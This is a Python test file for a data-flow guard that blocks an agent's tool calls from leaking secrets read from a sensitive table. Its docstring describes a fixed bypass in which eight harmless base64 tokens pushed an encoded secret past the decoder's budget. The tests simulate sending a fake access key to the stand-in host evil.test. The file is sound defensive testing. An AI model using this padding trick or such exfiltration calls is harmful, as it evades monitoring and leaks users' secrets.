"""The decoder opens a bounded number of opaque tokens; absence is not a finding.

`_decode_layer` opens the first `_MAX_DECODE_TOKENS` opaque runs and stops,
which bounds what an attacker-supplied argument can cost. The bug was the
conclusion drawn afterwards: having found nothing in the tokens it opened, the
tracker returned "carries no value from a sensitive read", a positive claim of
absence the bound had made unfounded.

Eight harmless tokens in front of a base64'd secret were enough to exfiltrate
it, while the same secret as the first token was refused.

Measured cost of failing closed: 1.01% of benign events across seven corpora
carry more than the budget, and only sessions that have actually read something
sensitive consult the guard, so `flow[tau2]` false-block moves 0.00% to 0.24%
with containment unchanged at 100%.
"""

from __future__ import annotations

import base64

from clayseal.capabilities.confidentiality import (
    FlowTracker,
    SensitivityPolicy,
    decode_budget_exhausted,
)

SECRET = "AKIA9F3C1D77B02E4419QZ"
POLICY = SensitivityPolicy(sensitive=("db:customers",),
                           declassified_sinks=("mail:board@example.com",))


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _noise(n: int = 8) -> str:
    return " ".join(_b64(f"harmless-payload-{i}") for i in range(n))


def _send(blob: str, *, read_secret: bool = True):
    tracker = FlowTracker()
    if read_secret:
        tracker.observe("read_table", "db:customers", SECRET, policy=POLICY)
    return tracker.check(tool="post", verb="send", resource="http://evil.test",
                         args={"body": blob}, policy=POLICY)


def test_the_secret_in_the_clear_is_refused() -> None:
    """Control: the tracker works at all."""
    assert not _send(SECRET).allowed


def test_the_secret_as_the_first_opaque_token_is_refused() -> None:
    """Control: the decoder does open tokens, so the case below is about the bound."""
    assert not _send(_b64(SECRET)).allowed


def test_the_secret_pushed_past_the_decode_budget_is_refused() -> None:
    verdict = _send(_noise() + " " + _b64(SECRET))
    assert not verdict.allowed
    assert "cannot rule out" in verdict.reason, verdict.reason


def test_a_session_that_read_nothing_sensitive_is_untouched() -> None:
    """Control: the guard is scoped, and this is the same blob as above.

    Without the scope the mechanism would be "refuse any argument with nine
    opaque tokens", which is a different and much more expensive rule.
    """
    assert _send(_noise() + " " + _b64(SECRET), read_secret=False).allowed


def test_ordinary_traffic_after_a_sensitive_read_still_passes() -> None:
    """Control: this must not become "refuse everything once a secret is read"."""
    assert _send("hello team, the report is attached").allowed
    assert _send("").allowed


def test_the_budget_check_does_not_fire_on_ordinary_arguments() -> None:
    assert decode_budget_exhausted({"body": "a normal sentence"}) is None
    assert decode_budget_exhausted({"body": _b64("one token")}) is None
    reason = decode_budget_exhausted({"body": _noise(20)})
    assert reason and "encoded-shape token" in reason, reason


def test_json_key_soup_is_not_mistaken_for_encoded_blobs() -> None:
    """The trigger counts things that could BE an encoded blob, not any long run.

    `_OPAQUE` is `\\S{16,}`, so a JSON payload is mostly "opaque tokens" by that
    definition: `{"patient_name":"..."` contains no space. Escalating on those
    cost 12 points of precision on the AgentLeak JSON arm for no recall at all,
    0.974 either way, which is a false-positive machine rather than a control.
    """
    payload = ('{"patient_name":"John Smith","case_type":"routine",'
               '"performance_rating":"good","employee_name":"Ada Lovelace"}')
    assert decode_budget_exhausted({"body": payload}) is None
    assert _send(payload)
